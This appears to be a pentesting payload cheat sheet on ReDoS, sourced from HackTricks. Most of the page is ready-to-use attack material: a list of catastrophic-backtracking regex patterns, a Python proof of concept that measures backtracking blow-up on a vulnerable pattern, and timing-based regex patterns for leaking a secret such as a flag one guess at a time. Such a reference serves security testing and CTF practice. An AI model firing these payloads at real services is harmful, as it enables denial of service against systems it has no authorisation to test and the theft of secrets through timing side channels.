---
title: "Payloads: ReDoS"
type: payloads
tags: [payloads, redos, dos, regex, web]
sources: [hacktricks-web]
date_created: 2026-07-14
date_updated: 2026-07-14
---

# Payloads: ReDoS

Evil-regex denial-of-service and blind regex exfiltration primitives. See [[redos]].

## Evil patterns (all catastrophic on `"a"*N + "!"`)
```
(a+)+       ([a-zA-Z]+)*      (a|aa)+      (a|a?)+     (.*a){100}
(\w*)+$     (a*)+$            (a+)*$       (a|a?)+$    (a?){100}$
```

## PoC recipe
Prefix into the vulnerable subpattern, long ambiguous run (`a`/`_`/space), then a final
char that forces total failure so the engine backtracks all paths. Grow N by 2^k and watch latency.
```python
import re,time
pat=re.compile(r'(\w*_)\w*$')
for n in [2**k for k in range(8,15)]:
    s='v'+'_'*n+'!'; t=time.time(); pat.search(s); print(n, f"{time.time()-t:.3f}s")
```

## Blind regex exfiltration (you control the regex a secret is matched with; time = matched)
```
^(?=<known_prefix>)((.*)*)*salt$
^(?=HTB{sOmE_fl<guess>).*.*.*.*.*.*.*.*!!!!$
<flag>(((((((.*)*)*)*)*)*)*)!
```

Immune engines (pivot away): RE2/RE2J/RE2JS, Rust regex. Tools: regexploit, redos-checker.

Source: HackTricks (pentesting-web)
